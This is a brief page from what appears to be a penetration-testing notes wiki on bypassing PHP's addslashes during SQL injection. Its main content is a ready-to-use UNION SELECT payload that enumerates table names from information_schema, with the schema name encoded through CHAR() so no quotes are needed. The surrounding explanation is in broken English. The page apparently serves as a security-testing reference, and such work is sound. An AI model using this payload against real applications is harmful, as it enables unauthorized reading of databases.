---
description: When the application, adds a / on the final of URL
---

# SQLI | Bypass addslashes

**Context:** But in the "" in Warning, a /-> "/" is added

{% content-ref url="../vulnerabilities/sqli/sqli-or-error-based.md" %}
[sqli-or-error-based.md](../vulnerabilities/sqli/sqli-or-error-based.md)
{% endcontent-ref %}

```
union select 1,2,table_name,4,5 from information_schema.tables where table_schema=char(xxx,xxx,xxx,xxx) %23
```

**Note:** Change the xxx to the values ​​corresponding to the chars of the table name string
